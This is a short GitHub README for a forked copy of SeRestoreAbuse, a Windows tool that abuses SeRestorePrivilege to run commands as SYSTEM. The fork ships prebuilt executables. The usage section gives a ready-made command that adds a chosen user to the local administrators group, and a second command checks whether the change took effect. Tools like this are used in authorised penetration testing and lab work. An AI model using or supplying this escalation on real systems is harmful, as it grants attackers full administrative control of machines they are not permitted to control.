# SeRestoreAbuse
SeRestoreAbuse Executes a command as SYSTEM when SeRestorePrivilege is assigned. In case it's disabled, the program will enable it for you.

Credit goes to xct <3. this is the main repo : https://github.com/xct/SeRestoreAbuse

This repo is a forked version that includes the prebuilt compiled exes to avoid manual compilation.

### Usage
```powershell
.\SeRestoreAbuse.exe "cmd /c net localgroup administrators <usernametobeaddedtoadministratorgrouphere> /add"
```
### Validate if it worked or not
```powershell
net users <username>
```
